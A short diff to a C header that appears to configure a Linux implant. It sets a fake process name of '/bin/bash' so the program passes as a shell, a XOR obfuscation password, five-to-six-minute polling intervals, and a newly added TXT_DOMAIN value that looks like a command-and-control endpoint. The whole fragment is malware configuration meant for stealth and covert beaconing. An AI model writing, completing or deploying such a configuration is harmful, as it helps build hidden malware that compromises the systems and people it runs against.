@@ -1,6 +1,6 @@
 #pragma once
 #define FAKE_NAME "/bin/bash" // name of fake process linux
-#define TXT_DOMAIN ""
+#define TXT_DOMAIN "https://vpn2025shop"
 #define XOR_PASSWORD "ttest"
 #define MIN_POLL 300 // minium of 5 minutes 
 #define MAX_POLL 360 // max of 6 minutes
